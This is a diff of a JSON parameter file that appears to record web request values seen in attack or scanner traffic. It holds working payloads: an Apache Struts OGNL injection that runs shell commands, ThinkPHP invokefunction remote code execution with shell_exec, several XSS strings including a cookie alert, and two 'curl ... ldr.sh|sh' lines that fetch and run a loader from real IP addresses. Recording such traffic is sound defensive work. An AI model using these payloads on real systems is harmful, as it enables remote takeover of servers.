@@ -2,7 +2,7 @@
  "parameters": [
   {
    "name": "PHPSESSID",
-   "uuid": "4f30a612-176d-4387-b55a-88f3d112552a"
+   "uuid": "9b2b0926-488a-46c8-8f8b-87d95906b32d"
   },
   {
    "name": "action",
@@ -10,11 +10,11 @@
   },
   {
    "name": "album",
-   "uuid": "bc45aad9-51a8-460f-94a5-aa772483614a"
+   "uuid": "cd89ce39-103c-45b8-8fd9-a539ffd3ed4a"
   },
   {
    "name": "category",
-   "uuid": "332b6ad2-60f7-4501-8891-35ba6a4276d9"
+   "uuid": "3e4d47c6-ce78-4e67-9f06-68cc420653e0"
   },
   {
    "name": "content",
@@ -33,12 +33,20 @@
    "uuid": "ddeb31e4-8804-4202-a949-4ba074ef6eb7"
   },
   {
+   "name": "mod",
+   "uuid": "5b808368-4b58-4e0b-a070-fa48d5a076ec"
+  },
+  {
    "name": "name",
    "uuid": "0f2c22a1-58bc-429a-92ad-37026ff918a4"
   },
   {
    "name": "page",
    "uuid": "b5425de9-64ef-47a1-9cfb-de1bf917127c"
+  },
+  {
+   "name": "param",
+   "uuid": "09dd60d6-817b-4168-9199-283bde548b5c"
   },
   {
    "name": "s",
@@ -63,8 +71,10 @@
    "feed": "rss2",
    "id": "1",
    "invitaion_code": "PHNjcmlwdD5hbGVydChTdHJpbmcuZnJvbUNoYXJDb2RlKDgxLDg1LDY1LDc2LDg5LDgzLDg4LDgzLDgzLDg0LDY5LDgzLDg0KSk8L3NjcmlwdD4=",
+   "mod": "qualyscfyz",
    "name": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='QUALYS-STRUTS-370547').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}",
    "page": "'",
+   "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "/Index/\\think\\app/invokefunction",
    "vars_0_": "shell_exec",
    "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
@@ -78,8 +88,10 @@
    "feed": "rss2",
    "id": "1",
    "invitaion_code": "PHNjcmlwdD5hbGVydChTdHJpbmcuZnJvbUNoYXJDb2RlKDgxLDg1LDY1LDc2LDg5LDgzLDg4LDgzLDgzLDg0LDY5LDgzLDg0KSk8L3NjcmlwdD4=",
+   "mod": "qualyscfyz",
    "name": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='QUALYS-STRUTS-370547').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}",
    "page": "'",
+   "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "/Index/\\think\\app/invokefunction",
    "vars_0_": "curl --user-agent curl_tp5 http://31.210.20.181/ldr.sh|sh",
    "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
@@ -93,8 +105,10 @@
    "feed": "rss2",
    "id": "1",
    "invitaion_code": "PHNjcmlwdD5hbGVydChTdHJpbmcuZnJvbUNoYXJDb2RlKDgxLDg1LDY1LDc2LDg5LDgzLDg4LDgzLDgzLDg0LDY5LDgzLDg0KSk8L3NjcmlwdD4=",
+   "mod": "qualyscfyz",
    "name": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='QUALYS-STRUTS-370547').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}",
    "page": "pie-register",
+   "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "/Index/\\think\\app/invokefunction",
    "vars_0_": "md5",
    "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
@@ -108,8 +122,10 @@
    "feed": "rss2",
    "id": "1",
    "invitaion_code": "PHNjcmlwdD5hbGVydChTdHJpbmcuZnJvbUNoYXJDb2RlKDgxLDg1LDY1LDc2LDg5LDgzLDg4LDgzLDgzLDg0LDY5LDgzLDg0KSk8L3NjcmlwdD4=",
+   "mod": "qualyscfyz",
    "name": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='QUALYS-STRUTS-370547').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}",
    "page": "'",
+   "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "/Index/\\think\\app/invokefunction",
    "vars_0_": "curl --user-agent curl_tp5 http://194.40.243.98/ldr.sh|sh",
    "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
@@ -123,8 +139,10 @@
    "feed": "rss2",
    "id": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='QUALYS-STRUTS-370547').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}",
    "invitaion_code": "PHNjcmlwdD5hbGVydChTdHJpbmcuZnJvbUNoYXJDb2RlKDgxLDg1LDY1LDc2LDg5LDgzLDg4LDgzLDgzLDg0LDY5LDgzLDg0KSk8L3NjcmlwdD4=",
+   "mod": "<script>alert(document.cookie)</script>",
    "name": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='QUALYS-STRUTS-370547').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}",
    "page": "x",
+   "param": "PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
    "s": "index/\\think\\Request/input",
    "vars_0_": "__HelloThinkPHP",
    "weekstartday": "alert(String.fromCharCode(81,85,65,76,89,83,88,83,83,84,69,83,84))"
